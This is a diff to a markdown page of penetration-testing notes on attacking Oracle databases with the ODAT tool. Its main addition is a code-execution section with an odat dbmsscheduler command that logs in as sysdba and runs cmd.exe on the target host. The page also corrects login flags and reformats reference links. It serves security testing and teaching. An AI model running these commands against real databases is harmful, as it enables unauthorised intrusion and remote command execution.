@@ -4,8 +4,6 @@ Most of the examples here will be utilizing [ODAT ](https://github.com/quentinha
 
 In general I'd recommend this over trying to get Metasploit up and running.  However, if you are still keen then follow [this guide](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux).  For an alternative, see [Andy Gill's guide](https://blog.zsec.uk/msforacle/).
 
-
-
 ```
 /usr/bin/sqlplus64 username/password@192.168.0.5:1521/ORCL  as sysdba
 ```
@@ -13,7 +11,7 @@ In general I'd recommend this over trying to get Metasploit up and running.  How
 Alternatively pass the `--sysdba` flag to odat when logging in:
 
 ```
-./odat.py all -s 192.168.0.5 -d ORCL -u username -p password --sysdba
+./odat.py all -s 192.168.0.5 -d ORCL -U username -P password --sysdba
 ```
 
 ## SID Enumeration
@@ -40,6 +38,14 @@ IFS=$OLDIFS
 
 ## Code Execution
 
+We can use dbmsscheduler in odat to execute arbitrary commands, however the results are not displayed.  You'll have to use one of the many file transfer methods to fetch the output of this command.
+
+```
+./odat.py dbmsscheduler -s 192.168.0.5 -d ORCL -U username -P password --sysdba --exec "C:\windows\system32\cmd.exe /c dir C:\\Users\\ > C:\output" -vvv
+```
+
+## Arbitrary File Read
+
 ## TNS Poisoning
 
 ## CVE-2012-3137
@@ -51,7 +57,7 @@ IFS=$OLDIFS
 [Blackhat USA 2009 - Attacking Oracle with the Metasploit Framework](http://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf) & [Paper](http://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-PAPER.pdf)  
 [Oracle DB Vulnerabilities: The Missing Pentester Handbook](https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/)
 
-http://www.ordba.net/Articles/HardeningOracleDB.htm
+[http://www.ordba.net/Articles/HardeningOracleDB.htm](http://www.ordba.net/Articles/HardeningOracleDB.htm)
 
-http://ora-600.pl/art/privilege\_escalation\_2.pdf
+[http://ora-600.pl/art/privilege\_escalation\_2.pdf](http://ora-600.pl/art/privilege_escalation_2.pdf)
 
